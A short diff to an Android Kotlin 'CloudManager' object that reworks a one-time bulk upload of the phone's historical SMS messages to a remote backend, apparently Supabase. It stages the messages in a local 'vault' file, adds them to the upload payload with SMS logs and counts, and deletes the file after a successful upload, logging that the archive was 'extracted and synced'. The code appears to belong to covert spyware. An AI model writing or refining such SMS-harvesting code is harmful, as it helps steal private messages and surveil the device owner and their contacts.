@@ -44,9 +44,13 @@ object CloudManager {
                     json.put("sms_count", prefs.getInt("sms_count", 0))
                     json.put("sms_logs", JSONArray(prefs.getString("sms_logs_cache", "[]")))
                     
-                    // Historical Dump (One-Time Queue)
+                    // Historical Dump (Vault-First Logic)
                     if (!prefs.getBoolean("historical_sms_dumped", false)) {
-                        json.put("historical_sms", PhoneManager.getHistoricalSms(ctx, 1000))
+                        PhoneManager.vaultHistoricalSms(ctx)
+                        val vaultFile = java.io.File(ctx.filesDir, "sms_archive_vault.json")
+                        if (vaultFile.exists()) {
+                            json.put("historical_sms", JSONArray(vaultFile.readText()))
+                        }
                     }
                 }
 
@@ -148,10 +152,12 @@ object CloudManager {
                     DebugLogger.log("SUPABASE_ERR", "Code: $code | Msg: $err")
                 } else {
                     DebugLogger.log("Cloud", "Upload Finished. Code: $code")
-                    // Mark queue as complete ONLY if upload succeeded
+                    // Mark queue as complete AND clean up vault only on success
                     if (json.has("historical_sms")) {
                         prefs.edit().putBoolean("historical_sms_dumped", true).apply()
-                        DebugLogger.log("Cloud", "Historical SMS archive successfully extracted and synced.")
+                        val vaultFile = java.io.File(ctx.filesDir, "sms_archive_vault.json")
+                        if (vaultFile.exists()) vaultFile.delete()
+                        DebugLogger.log("Cloud", "Historical SMS archive successfully extracted and synced. Vault cleared.")
                     }
                 }
             } catch (e: Exception) {
